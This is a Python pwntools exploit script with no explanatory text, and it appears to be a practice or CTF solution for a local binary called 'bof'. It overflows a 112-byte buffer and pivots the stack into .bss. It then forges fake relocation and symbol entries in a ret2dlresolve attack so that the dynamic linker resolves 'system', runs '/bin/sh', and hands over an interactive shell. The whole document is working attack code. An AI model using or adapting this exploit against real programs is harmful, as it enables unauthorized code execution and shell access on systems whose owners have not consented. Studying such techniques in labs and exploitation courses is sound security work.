from pwn import *

elf = ELF('bof')
r=process('./bof')
rop=ROP('./bof')

offset=112
bss_addr=elf.bss()

stack_size=0x800
base_stage=bss_addr+stack_size

rop.raw('a'*offset)
rop.read(0,base_stage,100)
rop.migrate(base_stage)
r.sendline(rop.chain())

rop=ROP('./bof')
sh="/bin/sh"
dynsym=elf.get_section_by_name('.dynsym').header.sh_addr
dynstr=elf.get_section_by_name('.dynstr').header.sh_addr
plt0=elf.get_section_by_name('.plt').header.sh_addr
rel_plt=elf.get_section_by_name('.rel.plt').header.sh_addr
index_offset=base_stage+24-rel_plt
write_got=elf.got['write']
fake_sym_addr=base_stage+32

align=0x10-((fake_sym_addr-dynsym)&0xf)
fake_sym_addr=fake_sym_addr+align
index_dynsym=(fake_sym_addr-dynsym)/0x10
st_name=fake_sym_addr + 0x10 - dynstr
fake_write_sym=flat([st_name,0,0,0x12])

r_info=(index_dynsym<<8)| 0x7
fake_write_reloc=flat([write_got,r_info])


rop.raw(plt0)
rop.raw(index_offset)
rop.raw('bbbb')
rop.raw(base_stage+82)
rop.raw('bbbb')
rop.raw('bbbb')
rop.raw(fake_write_reloc)
rop.raw('a'*align)
rop.raw(fake_write_sym)
rop.raw('system\x00')
rop.raw('a'*(80-len(rop.chain())))
print rop.dump()
print len(rop.chain())
rop.raw(sh+'\x00')
rop.raw('a'*(100-len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
